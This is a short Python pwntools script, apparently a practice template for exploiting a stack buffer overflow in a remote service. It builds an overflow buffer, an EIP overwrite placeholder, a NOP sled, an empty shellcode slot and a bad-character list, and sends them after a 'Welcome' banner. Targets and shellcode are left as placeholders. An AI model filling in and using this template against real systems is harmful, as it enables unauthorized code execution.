#!/usr/bin/env python3
# Exploit template

from pwn import *

rhost = "XXX.XXX.XXX.XXX"
rport = XXXX

offset = XXXX # EIP @ 0x616A6761
overflow = b"A" * offset
eip = b"BBBB" # 625011AF
padding = b"\x90" * 16

sc =  b""

# \x00
badchars = [0x00] # start with null (Separate with commas)

# Generate full list of chars minus the "bad" ones
charpayload = b"".join([bytes([x]) for x in range(256) if x not in badchars])

buf = b""
buf += overflow
# buf += eip 
# buf += padding 
# buf += sc
# buf += charpayload

r = remote(rhost, rport)

if r.recvline_startswith("Welcome "):
    log.info("Got Welcome")

    try:
        log.info("Sending evil buffer...")
        r.newline = b"\r\n"
        r.sendline(b"BOF " + buf)
        # print(r.recv())
        log.info("Done!")
    except Exception as e:
        log.info(f"Caught exception: {e}")
else:
    log.error("Unknown response" + recvline())
    exit()